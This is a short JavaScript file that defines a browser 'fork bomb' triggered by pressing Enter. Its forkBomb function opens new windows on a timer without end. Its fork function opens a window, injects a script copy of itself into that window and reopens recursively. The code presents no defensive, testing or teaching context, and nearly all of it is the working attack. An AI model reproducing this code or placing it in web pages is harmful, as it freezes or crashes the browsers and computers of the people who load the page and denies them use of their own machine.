function forkBomb(timeout = 500, i = 0) {
  setTimeout(() => {
    window.open('./?v=' + Math.random(), '_new' + (i || ''))
    forkBomb(timeout, i + 1)
  }, timeout)

  fork();
}


document.addEventListener('keydown', function(event) {
  if (event.key == 'Enter') {
    forkBomb()
  }
});

function fork() {
  const win = window.open();
  const script = win.document.createElement("script");
  script.innerHTML = fork + "\n" + "fork();";
  win.document.head.appendChild(script);
  setTimeout(function() {
    win.close();
    fork();
  }, 250)
}
